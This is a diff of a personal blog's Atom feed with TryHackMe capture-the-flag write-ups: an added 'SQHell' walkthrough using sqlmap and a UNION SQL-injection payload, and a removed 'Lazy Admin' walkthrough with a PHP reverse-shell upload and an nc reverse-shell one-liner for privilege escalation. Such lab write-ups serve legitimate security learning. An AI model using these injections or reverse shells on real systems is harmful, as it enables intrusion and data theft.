@@ -1,4 +1,172 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-05T17:06:07+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Corridor</title><link href="http://localhost:4000/tryhackme-corridor/" rel="alternate" type="text/html" title="TryHackMe - Corridor" /><published>2023-07-05T00:00:00+03:00</published><updated>2023-07-05T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-corridor</id><content type="html" xml:base="http://localhost:4000/tryhackme-corridor/"><![CDATA[<p>Can you escape the Corridor?</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-06T19:08:25+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - SQHell</title><link href="http://localhost:4000/tryhackme-sqhell/" rel="alternate" type="text/html" title="TryHackMe - SQHell" /><published>2023-07-06T00:00:00+03:00</published><updated>2023-07-06T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-sqhell</id><content type="html" xml:base="http://localhost:4000/tryhackme-sqhell/"><![CDATA[<p>Try and find all the flags in the SQL Injections.</p>
+
+<p>Give the machine a minute to boot and then connect to http://MACHINE_IP</p>
+
+<p>There are 5 flags to find but you have to defeat the different SQL injection types.</p>
+
+<p>Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.</p>
+
+<p><br /></p>
+
+<h3 id="flag-1">Flag 1</h3>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">Nmap</code> scan to gather information about the target.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.60.81
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/nmap.png" alt="nmap" /></p>
+
+<p>As we see <code class="language-plaintext highlighter-rouge">22/tcp and 80/tcp</code> ports are open.</p>
+
+<p>Let’s <code class="language-plaintext highlighter-rouge">explore the website</code> accessible through the HTTP port.</p>
+
+<p>We can see, <code class="language-plaintext highlighter-rouge">two posts shared by the admin</code> on the website.</p>
+
+<p>And looks like three pages on the homepage. These are the <code class="language-plaintext highlighter-rouge">Terms &amp; Conditions page</code>, a <code class="language-plaintext highlighter-rouge">login</code>, and a <code class="language-plaintext highlighter-rouge">register</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/home.png" alt="home" /></p>
+
+<p>Let’s click on the admin and see what’s in there.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/admin.png" alt="admin" /></p>
+
+<p>We can see the admin’s ID. And the admin’s two posts.</p>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">login page and try bypassing</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/login.png" alt="login" /></p>
+
+<p>First, we’ll capture the login page request using BurpSuite and <code class="language-plaintext highlighter-rouge">forward it to Intruder</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/intruder.png" alt="intruder" /></p>
+
+<p>After that, we’ll copy the <a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">payload</a> list and paste it into BurpSuite.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/payload.png" alt="payload" /></p>
+
+<p>Now let’s start an attack and see the results.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/flag-1.png" alt="flag-1" /></p>
+
+<p>Success! We found the <code class="language-plaintext highlighter-rouge">first flag</code>.</p>
+
+<p><br /></p>
+
+<h3 id="flag-2">Flag 2</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Hint: Make sure to read the terms and conditions ;)</code></strong></p>
+
+<p>Let’s check the <code class="language-plaintext highlighter-rouge">terms and conditions</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/term.png" alt="term" /></p>
+
+<p>An interesting condition is mentioned here.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">iii: We log your IP address for analytics purposes</code></strong></p>
+
+<p>We can derive the following from this. This website may be performing <code class="language-plaintext highlighter-rouge">IP-based security</code> checks or access controls. This can be done using <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> is used to preserve the real IP address of the client while passing the HTTP request between servers. If intermediate servers like proxy servers or load balancers are used, the actual client IP address can be lost, and the IP addresses of these intermediate servers are passed to the server. The <code class="language-plaintext highlighter-rouge">X-Forwarded-For header is used to fix this situation</code>. Intermediate servers can forward the real client IP address by adding it to the X-Forwarded-For header. In this way, the server can identify the correct IP address by reading the real client’s IP address from the X-Forwarded-For header. However, these <code class="language-plaintext highlighter-rouge">headers can be manipulated, and fake IP addresses can be added</code>.</p>
+
+<p>To manipulate the X-Forwarded-For header for this purpose, we will use the <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code>parameter in sqlmap.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">"--headers='X-forwarded-for:1*'"</code> parameter allows the sqlmap tool to automatically perform this manipulation. By adding the expression <code class="language-plaintext highlighter-rouge">"1*"</code> to the header, the beginning of an IP address is specified as the header value. This is used to try different scenarios when attempting to bypass IP-based controls or restrictions in a web application.</p>
+
+<p>Let’s do the attack.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/sqlmap.png" alt="sqlmap" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Great!</code> We found a <code class="language-plaintext highlighter-rouge">Time-Based Blind SQLi</code> vulnerability.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/time.png" alt="time" /></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">Flag-2</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.60.81/ -D sqhell_1 --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/flag-2.png" alt="flag-2" /></p>
+
+<p><br /></p>
+
+<h3 id="flag-3">Flag 3</h3>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">register page</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/register.png" alt="register" /></p>
+
+<p>Capture the request and save it using BurpSuite <code class="language-plaintext highlighter-rouge">(Right Click &gt; Save Item)</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/cap-reg.png" alt="cap-reg" /></p>
+
+<p>Perform a sqlmap scan on the captured request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test6.req -D sqhell_3 -T flag --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/flag-3.png" alt="flag-3" /></p>
+
+<p>We found <code class="language-plaintext highlighter-rouge">Flag-3</code>.</p>
+
+<p><br /></p>
+
+<h3 id="flag-4">Flag 4</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Hint: Well, dreams, they feel real while we're in them right?</code></strong></p>
+
+<p>Now, let’s return to the <code class="language-plaintext highlighter-rouge">user page</code>. You can see the URL <code class="language-plaintext highlighter-rouge">endpoint is /user?id=1</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/user.png" alt="user" /></p>
+
+<p>So, I try <code class="language-plaintext highlighter-rouge">id=2-1</code> for the <code class="language-plaintext highlighter-rouge">vulnerability detection</code>. And it’s <code class="language-plaintext highlighter-rouge">working</code>.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/detect.png" alt="detect" /></p>
+
+<p>So, let’s <code class="language-plaintext highlighter-rouge">capture the request</code> and <code class="language-plaintext highlighter-rouge">scan it using sqlmap</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test5.req --dbs   
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/sqhell-4.png" alt="sqhell-4" /></p>
+
+<p>We found the <code class="language-plaintext highlighter-rouge">sqhell_4 table</code> but the flag is <code class="language-plaintext highlighter-rouge">not in there</code>. Let’s try the <code class="language-plaintext highlighter-rouge">UNION payload</code> on the website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> /user?id=-1 UNION ALL SELECT "1 UNION SELECT 1,flag,3,4 FROM flag-- -", 1,2 FROM users#
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/flag-4.png" alt="flag-4" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">Flag-4</code>.</p>
+
+<p><br /></p>
+
+<h3 id="flag-5">Flag 5</h3>
+
+<p>Now, only the <code class="language-plaintext highlighter-rouge">post page</code> that we didn’t look at.</p>
+
+<p><img src="/assets/img/tryhackme/sqhell/post.png" alt="post" /></p>
+
+<p>As we see the <code class="language-plaintext highlighter-rouge">endpoint is /post?id=1</code>.</p>
+
+<p>Now, let’s capture the request and <code class="language-plaintext highlighter-rouge">scan with sqlmap</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r one.req -D sqhell_5 -T flag --dump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/sqhell/flag-5.png" alt="flag-5" /></p>
+
+<p>This one is easy. We found the <code class="language-plaintext highlighter-rouge">last flag</code>.</p>
+
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, mysql, sqli" /><summary type="html"><![CDATA[Try and find all the flags in the SQL Injections.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqhell.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/sqhell.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Corridor</title><link href="http://localhost:4000/tryhackme-corridor/" rel="alternate" type="text/html" title="TryHackMe - Corridor" /><published>2023-07-05T00:00:00+03:00</published><updated>2023-07-05T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-corridor</id><content type="html" xml:base="http://localhost:4000/tryhackme-corridor/"><![CDATA[<p>Can you escape the Corridor?</p>
 
 <p>You have found yourself in a strange corridor. Can you find your way back to where you came?</p>
 
@@ -17,9 +185,7 @@
 
 <p>As we see <code class="language-plaintext highlighter-rouge">80/tcp</code> port is open.</p>
 
-<p>Let’s visit that port.</p>
-
-<p>Here, we find a homepage.</p>
+<p>Let’s visit that port. And there it is a homepage.</p>
 
 <p><img src="/assets/img/tryhackme/corridor/home.png" alt="home" /></p>
 
@@ -1404,194 +1570,4 @@ $ ssh -i id_rsa charlie@10.10.153.7
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>
-
-<p><br /></p>
-
-<h2 id="1-lazy-admin">1. Lazy Admin</h2>
-
-<p>Have some fun! There might be multiple ways to get user access.</p>
-
-<p><br /></p>
-
-<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
-
-<p>Let’s do a nmap scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap" /></p>
-
-<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p>I see an apache default page on the website.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache" /></p>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one" /></p>
-
-<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content" /></p>
-
-<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>
-
-<p>So, I try another gobuster scan on this directory.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content" /></p>
-
-<p>We found a few directories here. Let’s examine all directories.</p>
-
-<ul>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>
-
-    <p>We found a lot of files in this directory.</p>
-
-    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc" /></p>
-
-    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>
-
-    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest" /></p>
-  </li>
-  <li>
-    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>
-
-    <p>We found a login page here.</p>
-
-    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as" /></p>
-  </li>
-</ul>
-
-<p><br /></p>
-
-<p>I searched SweetRice in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search" /></p>
-
-<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718">SweetRice 1.5.1 - Backup Disclosure</a></p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first" /></p>
-
-<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say" /></p>
-
-<p>Let’s go and see.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back" /></p>
-
-<p>Let’s go to the /mysql_backup/ directory.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file" /></p>
-
-<p>Let’s see what’s inside this file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside" /></p>
-
-<p>We found two important things here.</p>
-
-<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>
-
-<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>
-
-<p>It seems the password is a hash. Let’s identify and crack this hash.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id" /></p>
-
-<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>
-
-<p>Let’s crack. <a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>
-
-<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: *******</code></strong></em></p>
-
-<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home" /></p>
-
-<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>
-
-<p>Then we go to the Post &gt; Create</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create" /></p>
-
-<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below" /></p>
-
-<p>After the upload, the page looks like this.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload" /></p>
-
-<p>Now, we set up a netcat listener.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
-</code></pre></div></div>
-
-<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml">http://10.10.103.31/content/attachment/shell.phtml</a></p>
-
-<p>And we are inside.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside" /></p>
-
-<p>Now, let’s get to the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>
-
-<p>Very surprisingly for www-data, we have sudo privileges.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l" /></p>
-
-<p>The backup script is a Perl script that calls /etc/copy.sh</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy" /></p>
-
-<p>Now we edit this copy.sh, file to get the root privilege.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
-</code></pre></div></div>
-
-<p>Let’s setup a netcat listener.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
-</code></pre></div></div>
-
-<p>Let’s run the backup.pl file and get the root privilege.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc" /></p>
-
-<p>We are inside. Let’s get the root flag.</p>
-
-<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, linux" /><summary type="html"><![CDATA[Easy linux machine to practice your skills]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/lazy-admin.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/lazy-admin.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
